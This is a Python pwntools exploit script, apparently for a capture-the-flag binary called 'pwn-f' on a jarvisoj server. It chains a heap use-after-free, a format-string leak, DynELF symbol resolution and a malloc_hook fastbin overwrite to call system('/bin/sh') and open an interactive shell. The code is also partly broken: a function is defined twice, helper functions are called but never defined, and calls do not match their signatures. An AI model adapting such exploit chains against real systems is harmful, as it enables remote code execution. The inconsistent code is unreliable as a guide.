#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *

DEBUG = True
printf_plt = 0
if DEBUG:
	io = process("./pwn-f")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn-f")
else:
	io = remote("pwn2.jarvisoj.com","9887")
	libc = ELF("./libc-2.19.so")
	r = ROP(libc)
	elf = ELF("./pwn-f")
	malloc_hook = 0x3BE740+0x10
	offset = 0x3BE000

def Add(size,data):
	io.sendlineafter("3.quit\n","create ")
	io.sendlineafter("Pls give string size:",str(size))
	io.sendafter("str:",data)
	io.recvuntil("The string id is ")

def free(index):
	io.sendlineafter("3.quit\n","delete ")
	io.sendlineafter("id:",str(index))
	io.sendafter("Are you sure?:","yes")

def leak():
	Add(0x100*"a")
	Add(0x100*"b")
	free(1)
	search(0x1,"m","y")
	print search(0x1,"\x00","n")
	libc = show(0).split("Description:")[1][:6] + "\x00\x00"
	leak_addr = u64(show(0).split("Description:")[1][:6]+"\x00\x00")
	#print hex(info)
	print hex(leak_addr)
	if debug:
		leak_addr2 = leak_addr - offset
	else:
		leak_addr2 = leak_addr - leak_addr%0x1000 - offset
	log.success("libc_base:" + hex(leak_addr2))
	return leak_addr2, leak_addr

def leak(addr):
	free(0)
	Add(0x20,'aa%9$s' + '#' * (0x18 - len('aa%9$s')) + p64(printf_plt))
	io.recvuntil("quit")
	io.send("delete ")
	io.recvuntil("id:")
	io.sendline(str(1))
	io.recvuntil('sure?:')
	io.send("yes01234" + p64(addr))
	io.recvuntil('aa')
	data = io.recvuntil("####")[:-4]
	data += "\x00"
	return data

def leak_procbase():
	global printf_plt
	Add(0x4,0x4*"a")
	Add(0x4,0x4*"b")
	Add(0x4,0x4*"b")
	free(2)
	free(1)
	free(0)
	Add(0x20,"cc" + 0x16*"c"+ '\x2d' + '\x00')
	free(1)
	free(0)
	Add(0x20,"cc" + 0x16*"c"+ '\x2d' + '\x00')
	free(1)
	offset = 0x555555554d2d - 0x555555554000
	proc_base = u64(io.recvline().strip("\n")[-6:]+"\x00\x00") - offset
	print hex(proc_base)
	printf_plt = proc_base + 0x00000000000009D0
	print hex(printf_plt)
	free_got = proc_base + 0x0000000000202018
	return proc_base
	

def fastbinattack(libc_base):
	malloc_hook = libc.symbols["__malloc_hook"] + libc_base
	print hex(libc.symbols["__malloc_hook"])
	system_addr = libc.symbols["system"] + libc_base
	log.info("malloc_hook @" + hex(malloc_hook))
	log.info("system_addr @" + hex(system_addr))
	Add(0x40,0x40*"a")
	Add(0x60,0x60*"a")#7
	Add(0x60,0x60*"a")#8
	free(7)
	change(6, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0))

	Add(0x60,0x60*"a")
    # free_hook
	Add(0x60,"a")
    #		   memalign_hook     realloc_hook      malloc hook
	payload = 3 * 'a' + p64(0)	  + p64(0)	+ p64(libc_base + 0x45216)#0x4526a)
	change(8, len(payload), payload)
	io.sendlineafter("Your choice:","2")
	io.sendafter("Please enter the length of servant name:",str(0x100))

context.log_level = "debug"
#b *0x55555555514B\n 
#gdb.attach(io,"b *0x555555554D52")
proc_base = leak_procbase()
d = DynELF(leak, proc_base, elf=ELF('./pwn-f'))
system_addr = d.lookup('system', 'libc')
print "system_addr:", hex(system_addr)
free(0)
Add(0x20,"/bin/sh;ssssssss" + 0x8*"s" + p64(system_addr))
free(1)
io.interactive()
	
